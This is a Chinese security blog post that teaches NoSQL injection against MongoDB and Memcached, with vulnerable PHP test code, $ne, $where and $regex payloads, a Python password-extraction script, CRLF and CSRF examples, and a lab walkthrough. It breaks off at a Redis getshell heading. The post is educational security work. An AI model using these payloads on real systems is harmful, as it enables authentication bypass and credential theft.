<p><a href="https://www.jianshu.com/p/4d673e4ab5a7" target="_blank" rel="noopener">https://www.jianshu.com/p/4d673e4ab5a7</a></p>
<p><strong><a href="https://mp.weixin.qq.com/s/ICaT3mHRanupyojkpZ31VQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ICaT3mHRanupyojkpZ31VQ</a></strong></p>
<p><strong><a href="https://mp.weixin.qq.com/s/R1npSjFwoY-J_v7RaJqjEw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/R1npSjFwoY-J_v7RaJqjEw</a></strong></p>
]]></content>
      <categories>
        <category>业务安全</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>NoSql数据库getShell利用方法</title>
    <url>/2020/06/23/NoSql%E6%95%B0%E6%8D%AE%E5%BA%93getShell%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gg29h2writj31c00u0e81.jpg" alt="36"></p>
<a id="more"></a>

<h3 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h3><p>​    网络已经成为了现代社会中的第五世界，而说起网络就不得不提起数据库,数据库作为存储信息的应用软件，已经深入到了各行各业，购物、外卖、银行、游戏、出行等，可以说只要是提供服务给用户使用的软件或者网站都离不开数据库的应用。而用的最多的是关系型数据库，例如：MYSQL、MSSQL、Oracle。而本文讲解的是非关系型数据库(NoSQL)，NoSQL数据库知道的最多的可能就是MongoDB、Redis、Memcached、Cassandra，但是你们知道NoSQL数据库还有那些吗？NoSQL的注入你们了解的多吗？NoSQL数据库中有哪些数据库是可getshell的？本文就带你了解一下什么是NoSQL数据库，NoSQL数据库的注入方法及getshell的方法。</p>
<h3 id="0x01-NoSQL数据库特性"><a href="#0x01-NoSQL数据库特性" class="headerlink" title="0x01 NoSQL数据库特性"></a>0x01 NoSQL数据库特性</h3><p>​    NoSQL全称是Not Only SQL，意为不仅仅的SQL。是一种非关系型数据存储模式，它存储的不再是结构化数据，而是类型和固定的格式，以key-value键值对、列式、文档来存储。而相较于关系型数据库，非关系数据库的优点有如下几点：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、快速读写</span><br><span class="line">	主要例子有Redis，由于其逻辑简单，而且纯内存操作，使得其性能非常出色，单节点每秒可以处理超过10万次读写操作。</span><br><span class="line">2、方便扩展</span><br><span class="line">	NoSQL去掉关系数据库的关系型特性，很容易横向扩展，摆脱了以往老是纵向扩展的诟病。</span><br><span class="line">3、低廉成本</span><br><span class="line">	相较于关系型数据库来说，企业级授权费用降低很多。</span><br><span class="line">4、灵活的数据类型</span><br><span class="line">	NoSQL无需事先为要存储的数据建立字段，随时可以存储自定义的数据格式。</span><br></pre></td></tr></table></figure>

<p>NoSQL数据库分类和特点如下：</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggagqjf0fbj30th08yzmk.jpg" alt="image-20200630175238730"></p>
<h3 id="0x02-Nosql数据库注入"><a href="#0x02-Nosql数据库注入" class="headerlink" title="0x02 Nosql数据库注入"></a>0x02 Nosql数据库注入</h3><p>NoSQL数据库虽然不使用SQL语句，但用网上的一句话来说，有DB的地方就有injection。且NoSQL注入的危害更大，因语句是以Web应用程序的语言来注入并在服务器上执行，从而导致允许任意代码执行，所以潜在影响要大于传统的SQL注入。</p>
<p>NoSQL注入攻击流程(此图来源于owasp)</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnkiz8lkwj31ie0sedo6.jpg" alt="image-20200712015600235"></p>
<p>NoSQL注入大概分为重言式、联合查询、Javascript、盲注、背负式查询、跨域违规等，由于背负式查询和跨域违规两种方式资料太少，也没有实战环境可测试，所以着重讲解前面几种注入方式。(此处使用MongoDB数据库来进行演示)</p>
<p>准备测试数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">创建数据库</span><br><span class="line">use admin &#x2F;&#x2F;创建一个admin数据库,如果有admin数据库就选择admin数据库</span><br><span class="line">插入数据</span><br><span class="line">db.admin.insert(&#123;&#39;username&#39;:&#39;time&#39;,&#39;password&#39;:&#39;11111&#39;&#125;)&#x2F;&#x2F;默认会自动创建admin集合</span><br><span class="line">查询数据</span><br><span class="line">db.admin.find()&#x2F;&#x2F;查询所有数据</span><br><span class="line">查看所有数据库</span><br><span class="line">show dbs </span><br><span class="line">查看集合</span><br><span class="line">show collections</span><br></pre></td></tr></table></figure>

<h4 id="1、重言式"><a href="#1、重言式" class="headerlink" title="1、重言式"></a>1、重言式</h4><p>又称永真式，既在条件语句中注入代码使其表达式判定结果永远为真，从而绕过认证或访问机制。而怎么使其注入代码后让表达式判定结果永远为真，此处就不得不说一下Mongodb数据库的条件操作符了。如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$eq : &#x3D;    	&#x2F;&#x2F;匹配字段值等于指定值的文档</span><br><span class="line">$gt : &gt;		&#x2F;&#x2F;匹配字段值大于指定值的文档</span><br><span class="line">$lt : &lt;		&#x2F;&#x2F;匹配字段值小于指定值的文档</span><br><span class="line">$gte: &gt;&#x3D;	&#x2F;&#x2F;匹配字段值大于等于指定值的文档</span><br><span class="line">$lte: &lt;&#x3D;	&#x2F;&#x2F;匹配字段值小于等于指定值的文档</span><br><span class="line">$ne : !&#x3D;	&#x2F;&#x2F;匹配字段值不等于指定值的文档，包括没有这个字段的文档</span><br><span class="line">$in : in	&#x2F;&#x2F;匹配字段值等于指定数组中的任何值</span><br><span class="line">$nin: not in	&#x2F;&#x2F;字段值不在指定数组或者不存在</span><br><span class="line">$and		&#x2F;&#x2F;文档至少满足其中的一个表达式</span><br><span class="line">$or:or		&#x2F;&#x2F;文档至少满足其中的一个表达式</span><br><span class="line">$not: 		&#x2F;&#x2F;反匹配(1.3.3及以上版本),字段值不匹配表达式或者字段值不存在</span><br><span class="line">模糊查询用正则式：db.customer.find(&#123;&#39;name&#39;: &#123;&#39;$regex&#39;:&#39;.*s.*&#39;&#125; &#125;)</span><br></pre></td></tr></table></figure>

<p>而在重言式注入中需要用到的就是$ne，意为不等于指定值的数据查询出来，表达式ne=1，就是把数据库中除ne=1的所有值，全部查询出来。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 连接数据库</span></span><br><span class="line">$manager = <span class="keyword">new</span> MongoDB\Driver\Manager(<span class="string">"mongodb://localhost:27017"</span>);</span><br><span class="line">$uname = $_GET[<span class="string">'username'</span>];</span><br><span class="line">$pwd = $_GET[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询语句</span></span><br><span class="line">$query = <span class="keyword">new</span> MongoDB\Driver\Query(<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'uname'</span> =&gt; $uname,</span><br><span class="line">    <span class="string">'pwd'</span> =&gt; $pwd</span><br><span class="line">));</span><br><span class="line"><span class="comment"># 执行语句</span></span><br><span class="line">$result = $manager-&gt;executeQuery(<span class="string">'admin.admin'</span>, $query)-&gt;toArray();</span><br><span class="line">$count = count($result);</span><br><span class="line"><span class="keyword">if</span> ($count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $user) &#123;</span><br><span class="line">        $user = ((<span class="keyword">array</span>)$user);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'username:'</span> . $user[<span class="string">'uname'</span>] . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'password:'</span> . $user[<span class="string">'pwd'</span>] . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Not Found'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如图，此处输入对的账号密码查询出一条语句</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggkv7k8vhmj30nr03ot8x.jpg" alt="image-20200709174904553"></p>
<p>如果输入以下代码，则会将数据库中所有的账户密码全部查询出来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.239.135&#x2F;n&#x2F;login.php?username[$ne]&#x3D;1&amp;password[$ne]&#x3D;1</span><br><span class="line">此处$ne是把数据库中$ne等于1之外的数据都查询出来</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggkv6kn97cj30lo05qjs0.jpg" alt="image-20200709174804855"></p>
<p>如果输入username[$ne]=time&amp;password[$ne]=time111,会将账户不是time的所有数据显示。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnm5bfcgkj315e0cmq3s.jpg" alt="image-20200712025211991"></p>
<p>当用户输入username[$ne]=1&amp;password[$ne]=1的时候，程序会将用户输入的账户密码构造成以下数据带入数据库中查询。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$query &#x3D; new MongoDB\Driver\Query(array(</span><br><span class="line">	&#39;uname&#39; &#x3D;&gt; array($ne &#x3D;&gt; 1),</span><br><span class="line">	&#39;pwd&#39; &#x3D;&gt; array($ne &#x3D;&gt; 1)</span><br><span class="line">));</span><br></pre></td></tr></table></figure>

<p>数据库中查询出用户想要的数据</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnmlultjtj314a0jk0w2.jpg" alt="image-20200712030805742"></p>
<h4 id="2、联合查询"><a href="#2、联合查询" class="headerlink" title="2、联合查询"></a>2、联合查询</h4><p>​    攻击者利用一个脆弱的参数去改变给定查询返回的数据集，最常用的用法是绕过认证页面获取数据。比如通过增加永真式的表达式利用布尔的OR运算符导致整个语句判定出错。(因没有找到测试环境，此处大概讲一下注入方式)</p>
<p>小栗子：登录代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string query &#x3D; &quot;&#123; username:&#39;&quot; + post_username + &quot;&#39;, password:&#39;&quot; + post_passport + &#39; &quot; &#125;&quot;</span><br></pre></td></tr></table></figure>

<p>当我们登录账户时，正确的查询语句如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;‘username’:&#39;time&#39;,‘password’:&#39;time111&#39;&#125;</span><br></pre></td></tr></table></figure>

<p>如果构造一个恶意代码来忽略密码，那么就可以无需密码的情况下登录用户账号。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;time&#39;,$or:[&#123;&#125;,&#123;&#39;a&#39;:&#39;a&amp;password&#x3D;&#39;&#125;]</span><br><span class="line"></span><br><span class="line">构造的恶意语句</span><br><span class="line">&#123;&#39;username&#39;:&#39;time&#39;, &#39;$or&#39;:[&#123;&#125;,&#123;&#39;a&#39;:&#39;a&#39;,&#39;password&#39;:&#39;&#39;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<p>当将恶意语句带入数据库查询的时候匹配到当前用户的数据</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnqw0c15wj316e06i0u7.jpg" alt="image-20200712053615213"></p>
<h4 id="3、JavaScript注入"><a href="#3、JavaScript注入" class="headerlink" title="3、JavaScript注入"></a>3、JavaScript注入</h4><p>新型注入漏洞，由允许执行数据内容中的javascript的NoSQL数据库引入的。JavaScript使在数据引擎进行复杂事物和查询成为可能。传递不干净的用户输入到这些查询中可以注入任意JavaScript代码，导致非法的数据获取或篡改。而Mongodb中的$where操作符就可以用来执行Javascript语句。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$manager = <span class="keyword">new</span> MongoDB\Driver\Manager(<span class="string">"mongodb://localhost:27017"</span>);</span><br><span class="line">$query_body =<span class="keyword">array</span>(</span><br><span class="line"><span class="string">'$where'</span>=&gt;<span class="string">"function q() &#123;</span></span><br><span class="line"><span class="string">	var username = "</span>.$_REQUEST[<span class="string">"username"</span>].<span class="string">";</span></span><br><span class="line"><span class="string">	var password = "</span>.$_REQUEST[<span class="string">"password"</span>].<span class="string">";if(username == 'time'&amp;&amp;password == 'time111') return true; else&#123; return false;&#125;&#125;</span></span><br><span class="line"><span class="string">"</span>);</span><br><span class="line">$query = <span class="keyword">new</span> MongoDB\Driver\Query($query_body);</span><br><span class="line">$cursor = $manager-&gt;executeQuery(<span class="string">'test.test'</span>, $query)-&gt;toArray();</span><br><span class="line"><span class="keyword">if</span>(count($cursor)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"ok"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"no"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当不知道账号密码的时候，在地址栏随意输入字符，页面返回错误</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggl8tuedj8j31p00cqwfi.jpg" alt="image-20200710014015410"></p>
<p>当在参数后加上;return true;时页面返回ok</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggl8uvx2vsj31uc094wff.jpg" alt="image-20200710014115770"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：username&#x3D;1&amp;password&#x3D;1;return ture;</span><br><span class="line"></span><br><span class="line">当输入return ture;程序会构造出以下语句</span><br><span class="line">&#39;$where&#39;&#x3D;&gt;&quot;function q() &#123;</span><br><span class="line">	var username &#x3D; &quot;.$_REQUEST[&quot;username&quot;].&quot;;</span><br><span class="line">	var password &#x3D; &quot;.$_REQUEST[&quot;password&quot;].&quot;;</span><br><span class="line">	&#x2F;&#x2F;在此处添加一段代码，不管用户输入什么都返回ture</span><br><span class="line">	return ture;</span><br><span class="line">	if(username &#x3D;&#x3D; &#39;time&#39;&amp;&amp;password &#x3D;&#x3D; &#39;time111&#39;) return true; else&#123; return false;&#125;&#125;</span><br><span class="line">&quot;);</span><br><span class="line">带入数据库中查询成功</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggns7rphjij31hg08i76f.jpg" alt="image-20200712062208900"></p>
<h4 id="4、盲注"><a href="#4、盲注" class="headerlink" title="4、盲注"></a>4、盲注</h4><p>NoSQL的盲注和SQL注入盲注类似，都是不返回数据，只是根据错误页面的返回来判断是否存在注入。此处我们需要用到的MongoDB的操作符来进行盲注$eq(等于)和$regex(正则匹配)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$mongo = <span class="keyword">new</span> mongoclient();</span><br><span class="line">$db = $mongo-&gt;test; <span class="comment">//选择数据库</span></span><br><span class="line">$coll = $db-&gt;users; <span class="comment">//选择集合</span></span><br><span class="line">$username = $_REQUEST[<span class="string">'username'</span>];</span><br><span class="line">$password = $_REQUEST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span> (is_array($username)) &#123;</span><br><span class="line">    $data = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'username'</span>=&gt;$username);</span><br><span class="line">    $data = $coll-&gt;find($data);</span><br><span class="line">    <span class="keyword">if</span> ($data-&gt;count()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'yes'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'time no'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($username == <span class="string">'time'</span>&amp;&amp;$password==<span class="string">'time111'</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'ok'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'login no'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>随意输入字符，页面返回错误</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnsoj1q10j30yi05k0t8.jpg" alt="image-20200712063815493"></p>
<p>如果使用已知用户名为time，页面同样返回错误，而怎么才能确定账户是否正确，此时需要借助操作符$eq+burp，可以帮我们快速查找正确的账户。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnspqotjaj312c062t99.jpg" alt="image-20200712063925476"></p>
<p>首先找一个字典，由于我本地环境，所以用了四个账户测试。抓包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：username[$eq]&#x3D;§1111§&amp;password&#x3D;111</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnsx0ojetj31cw0qmjva.jpg" alt="image-20200712064625094"></p>
<p>设置字典</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnsy1hlnlj30s20ik764.jpg" alt="image-20200712064724308"></p>
<p>可以看见，跑出两个正确的用户名。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnsz0t6h2j31920sydj3.jpg" alt="image-20200712064820187"></p>
<p>当确定了账号后，密码则使用正则匹配$regex来获取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;判断密码长度</span><br><span class="line">http:&#x2F;&#x2F;10.211.55.3&#x2F;news.php?username[$eq]&#x3D;time&amp;password[$regex]&#x3D;.&#123;7&#125;</span><br><span class="line">http:&#x2F;&#x2F;10.211.55.3&#x2F;news.php?username[$eq]&#x3D;time&amp;password[$regex]&#x3D;t.&#123;6&#125;</span><br><span class="line">http:&#x2F;&#x2F;10.211.55.3&#x2F;news.php?username[$eq]&#x3D;time&amp;password[$regex]&#x3D;ti.&#123;5&#125;</span><br><span class="line">http:&#x2F;&#x2F;10.211.55.3&#x2F;news.php?username[$eq]&#x3D;time&amp;password[$regex]&#x3D;tim.&#123;4&#125;</span><br><span class="line">以此类推</span><br><span class="line">数据库中查询语句会使用$regex和^</span><br><span class="line">&#123;&#39;username&#39;:&#123;&#39;$eq&#39;:&#39;time&#39;&#125;,&#39;password&#39;:&#123;&#39;$regex&#39;:&#39;^&#39;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggntbiy2e8j316g08a40m.jpg" alt="image-20200712070021751"></p>
<p>而密码就有些复杂了，不能使用burp，不过可以借助脚本来测试。</p>
<p>脚本:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib3</span><br><span class="line">import string</span><br><span class="line">import urllib</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line">username &#x3D; &#39;admin&#39;</span><br><span class="line">password &#x3D; &#39;&#39;</span><br><span class="line">target &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;mongo&#x2F;test.php&#39;</span><br><span class="line">while True:</span><br><span class="line">    for c in string.printable:</span><br><span class="line">        if c not in [&#39;*&#39;, &#39;+&#39;, &#39;.&#39;, &#39;?&#39;, &#39;|&#39;, &#39;#&#39;, &#39;&amp;&#39;, &#39;$&#39;]:</span><br><span class="line">            payload &#x3D; &#39;?username&#x3D;%s&amp;password[$regex]&#x3D;^%s&#39; % (username, password + c)</span><br><span class="line">            r &#x3D; requests.get(target + payload)</span><br><span class="line">            if &#39;OK&#39; in r.text:</span><br><span class="line">                print(&quot;Found one more char : %s&quot; % (password+c))</span><br><span class="line">                password +&#x3D; c</span><br></pre></td></tr></table></figure>

<h4 id="5、背负式查询"><a href="#5、背负式查询" class="headerlink" title="5、背负式查询"></a>5、背负式查询</h4><p> 背负式查询是Memcached数据库的的一种注入，在php5.5的时候该漏洞被修复，所以网上资料较少，所以此处在网上摘抄了一部分作为了解。</p>
<p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set &lt;KEY&gt; &lt;FLAG&gt; &lt;EXPIRE_TIME&gt;   &lt;LENGTH&gt;,</span><br></pre></td></tr></table></figure>

<p>当PHP配置的函数被调用时，接收参数如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$memcached-&gt;set(&#39;key&#39;, &#39;value&#39;);</span><br></pre></td></tr></table></figure>

<p>该驱动程序未能针对带有回车\r(0x0D)和换行的\n(0x0A)的ASCII码采取措施,导致攻击者有机会注入包含有键参数的新命令行和其他非计划内的命令到缓存中8。如下代码,其中的$param是用户输入并作为键来作用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$memcached&#x3D;new Memcached(); $memcached -&gt;addServer(&#39;localhost&#39;,11211); $memcached-&gt;set($param, &quot;some value&quot;);</span><br></pre></td></tr></table></figure>

<p>攻击者可以提供以下输入进行注入攻击：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;key1 0 3600 4\r\nabcd\r\nset key2 0 3600 4\r\ninject\r\n&quot;</span><br></pre></td></tr></table></figure>

<p>增加到数据库中的第一个键是具有”some value”值的key1。攻击者可以增加其他的、非计划内的键到数据库中,即带有”inject”值的key2。这种注入也可以发生在get命令上。看一下Memcached主页上的示例,它以这三行开头：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Function get_foo(foo_id) foo &#x3D; memcached_get(&quot;foo: &quot; . foo_id) return foo if defined foo</span><br></pre></td></tr></table></figure>

<p>这个示例展示了Memcached的典型用法,在处理输入之前首先检查在数据库中是不是已经存在了。假设用类似代码检查从用户那里接收的认证令牌,验证他们是不是登录过了,那么就可以通过传递以下作为令牌的字符串来利用它:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;random_token\r\nset my_crafted_token 0 3600 4\r\nroot\r\n&quot;</span><br></pre></td></tr></table></figure>

<p>当这个字符串作为令牌传递时,数据库将检查这个”random_token”是否存在,然后将添加一个具有”root”值的”my_crafted_token”。之后,攻击者就可以发送具有root身份的my_crafted_token令牌了。<br>可以被这项技术攻击的其他指令还有：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">incr &lt;Key&gt; &lt;Amount&gt;</span><br><span class="line">decr &lt;Key&gt; &lt;Amount&gt;</span><br><span class="line">delete &lt;Key&gt;</span><br></pre></td></tr></table></figure>

<p>在此,incr用于增加一个键的值,decr用于缩减一个键的值,以及delete用于删除一个键。攻击者也可以用像set和get函数一样的手段来使用带来自己键参数的这三个函数。攻击者可以使用多条目函数进行同样的注入：deleteMulti、getMulti和setMulti,其中每一个键字段都可以被注入。回车换行注入可以被用于连接多个get请求。在一项我们进行的测试中,包括原始get在内最多可以连接17条。这样注入返回的结果是第一个键及其相应的值。</p>
<h4 id="6、跨域违规"><a href="#6、跨域违规" class="headerlink" title="6、跨域违规"></a>6、跨域违规</h4><p>NoSQL数据库的另一个常见特点是，他们能够常常暴露能够从客户端应用进行数据库查询的HTTP REST API。暴露REST API 的数据库包括MongoDB、CouchDB和HBase。暴露REST API 就直接把数据库暴露给应用了，甚至是仅基于HTML5的应用，因为它不再需要间接的驱动程序了，让任何编程语言都可以在数据库上执行HTTP查询。这么做的优势非常明显，但这一特点是否伴随着安全风险？我们的回答是肯定的：这种REST API给跨站点请求伪造（CSRF）暴露了数据库，让攻击者绕过了防火墙和其他外围防御。</p>
<p>HTTP REST APIs是NoSQL数据库中的一个流行模块，然而，它们引入了一类新的漏洞，它甚至能让攻击者从其他域攻击数据库。在跨域攻击中，攻击者利用合法用户和他们的网页浏览器执行有害的操作。是一种跨站请求伪造（CSRF）攻击形式的违规行为，在此网站信任的用户浏览器将被利用在NoSQL数据库上执行非法操作。通过把HTML格式的代码注入到有漏洞的网站或者欺骗用户进入到攻击者自己的网站上，攻击者可以在目标数据库上执行post动作，从而破坏数据库。</p>
<p>现在让我们看看CSRF攻击是如何使用这个函数增加新文件到管理员集合中的，从而在hr数据库（它被认为处于安全的内部网络中）中增加了一个新的管理员用户，如图5所示。若想攻击成功，必须要满足几个条件。首先，攻击者必须能操作一个网站，要么是他们自己的网站，要么是利用不安全的网站。攻击在该网站放置一个HTML表单以及一段将自动提交该表单的脚本，比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot; http:&#x2F;&#x2F;safe.internal. db&#x2F;hr&#x2F;admins&#x2F;_insert&quot; method&#x3D;&quot;POST&quot; name&#x3D;&quot;csrf&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;docs&quot; value&#x3D;&quot; [&#123;&quot;username&quot;:attacker&#125;]&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo4rz979kj30wg0l8k5n.jpg" alt="image-20200712133641169"></p>
<p>藏在防火墙后的内部网络内的用户被欺骗访问一个恶意外部网页，这将导致在内部网络的NoSQL数据库的 REST API 上执行非预期的查询。</p>
<p>第二，攻击者必须通过网络诱骗或感染用户经常访问的网站欺骗用户进入被感染的网站。最后，用户必须许可访问Mongoose HTTP接口。</p>
<p>用这种方式，攻击者不必进入内部网络即可执行操作，在本例中，是插入新数据到位于内部网络中的数据库中。这种攻击执行很简单，但要求攻击者要提前侦察去识别主机、数据库名称，等等。</p>
<h4 id="7、node-js注入-靶场"><a href="#7、node-js注入-靶场" class="headerlink" title="7、node.js注入(靶场)"></a>7、node.js注入(靶场)</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">靶场下载地址：https:&#x2F;&#x2F;github.com&#x2F;Charlie-belmer&#x2F;vulnerable-node-app</span><br><span class="line">环境：node.js、Mongodb</span><br><span class="line">进入APP目录下使用命令: node server.js启动环境</span><br><span class="line">PS：若提示错误，使用npm install 下载报错模块</span><br></pre></td></tr></table></figure>

<h5 id="登录绕过"><a href="#登录绕过" class="headerlink" title="登录绕过"></a>登录绕过</h5><p>此页面注入可使用重言式进行绕过登录</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggntfjlv2qj311m0mqgoh.jpg" alt="image-20200712070413889"></p>
<p>使用burp抓包，如下图</p>
<h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggm1f0fqb7j30rh0b3gn8.jpg" alt="image-20200710180920921"></h4><p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修改password</span><br><span class="line">	&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&#123;&quot;$ne&quot;:1&#125;&#125;</span><br><span class="line">修改</span><br><span class="line">	&#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;:&#123;&quot;$ne&quot;:1&#125;&#125;</span><br><span class="line">都可绕过账户密码登录</span><br></pre></td></tr></table></figure>

<p>注入成功</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggm1g72jkej30rl09vgn8.jpg" alt="image-20200710181032327"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnu5bax01j31jg0ikwj6.jpg" alt="image-20200712072859566"></p>
<h5 id="where注入"><a href="#where注入" class="headerlink" title="where注入"></a>where注入</h5><p>此页面类似联合查询注入</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnu6wbltbj31n80mitcc.jpg" alt="image-20200712073030844"></p>
<p>注入恶意代码使得表达式为真来获取所有用户名</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;&#39; || &#39;1&#39;&#x3D;&#x3D;&#39;1</span><br><span class="line"></span><br><span class="line">根据用户输入程序构造如下代码，带入数据库查询后返回所有用户信息</span><br><span class="line">’$where‘:’this.username‘ &#x3D;&#x3D; &#39;&#39; || &#39;1&#39;&#x3D;&#x3D;&#39;1&#39;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnue2b1smj329t0u0qab.jpg" alt="image-20200712073723584"></p>
<h3 id="0x03-NoSQL数据库GETSHELL方法"><a href="#0x03-NoSQL数据库GETSHELL方法" class="headerlink" title="0x03 NoSQL数据库GETSHELL方法"></a>0x03 NoSQL数据库GETSHELL方法</h3><p>老生常谈，其实网上有很多关于Redis或Mongodb的漏洞利用方法，不过本文既然是讲NoSQL，Redis和Mongodb算是NoSQL数据库中的代表性数据库，所以本文也总结一下利用方法。</p>
<h4 id="Redis-getshell方法总结"><a href="#Redis-getshell方法总结" class="headerlink" title="Redis getshell方法总结"></a>Redis getshell方法总结</h4><p>环境搭建</p>
